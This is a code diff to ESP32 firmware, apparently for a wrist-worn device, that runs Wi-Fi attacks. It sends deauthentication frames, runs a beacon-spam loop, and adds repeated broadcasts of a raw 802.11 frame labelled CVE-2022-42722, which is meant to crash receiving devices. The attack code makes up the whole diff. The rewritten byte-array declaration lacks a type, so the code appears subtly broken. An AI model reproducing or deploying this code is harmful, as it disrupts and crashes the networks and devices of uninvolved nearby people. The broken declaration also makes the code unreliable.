@@ -106,11 +106,17 @@ static const uint8_t deauth_frame_default[] = {
     0xf0, 0xff, 0x02, 0x00
 };
 
-char frame_raw_CVE_2022_42722[] = \
-	"\x80\xb4\xca\x92\x01\x00\x00\x00\x00\x01\x20\x00\x00\x00\xb1\xff" \
-	"\xff\xff\xff\x00\xff\x00\x00\x00\xc1\xb3\xca\x92\x00\x00\x4c\x4c" \
-	"\x4c\x4c\x4c\x4c\x4c\x10\xaa\xff\xd9\x00\x05\x00\xee\xa8\x1f\xd6" \
-	"\x7e\xc2\x4f\x10\xc1\x9c";
+static const frame_raw_CVE_2022_42722[] = {
+	0x80, 0xb4, 0xca, 0x92,
+	0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
+	0x20, 0x00, 0x00, 0x00, 0xb1, 0xff,
+	0xff, 0xff, 0xff, 0x00, 0xff, 0x00, 
+	0x00, 0x00, 0xc1, 0xb3, 0xca, 0x92, 
+	0x00, 0x00, 0x4c, 0x4c, 0x4c, 0x4c, 
+	0x4c, 0x4c, 0x4c, 0x10, 0xaa, 0xff,
+	0xd9, 0x00, 0x05, 0x00, 0xee, 0xa8, 
+	0x1f, 0xd6, 0x7e, 0xc2, 0x4f, 0x10, 0xc1, 0x9c
+};
 
 String alfa = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
 
@@ -305,6 +311,9 @@ void apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type){
     esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame_default), false);
     esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame_default), false); 
     log_i("Sending packets");
+    esp_wifi_80211_tx(WIFI_IF_STA, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722), false);
+    esp_wifi_80211_tx(WIFI_IF_STA, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722), false);
+    log_i("Sending CVE packets");
   
 }
 
@@ -450,7 +459,7 @@ static void wifi_autoon_onoff_event_handler( lv_obj_t * obj, lv_event_t event ) 
 
 void spam_task(void *pvParameter) {         motor_vibe(10);
                                             for(;;){
-                                            int set_channel = random(1,12);
+                                            int set_channel = random(1,13);
                                             esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
                                             delay(1);
 
@@ -483,8 +492,8 @@ void spam_task(void *pvParameter) {         motor_vibe(10);
                                              esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
                                              esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
                                              esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
-                                             esp_wifi_80211_tx(WIFI_IF_STA, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722)-1, false);
-                                             esp_wifi_80211_tx(WIFI_IF_AP, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722)-1, false);
+                                             esp_wifi_80211_tx(WIFI_IF_STA, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722), false);
+                                             esp_wifi_80211_tx(WIFI_IF_STA, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722), false);
                                              
                                              if ( lv_switch_get_state( beacon_spam_onoff ) ) {
                                              }
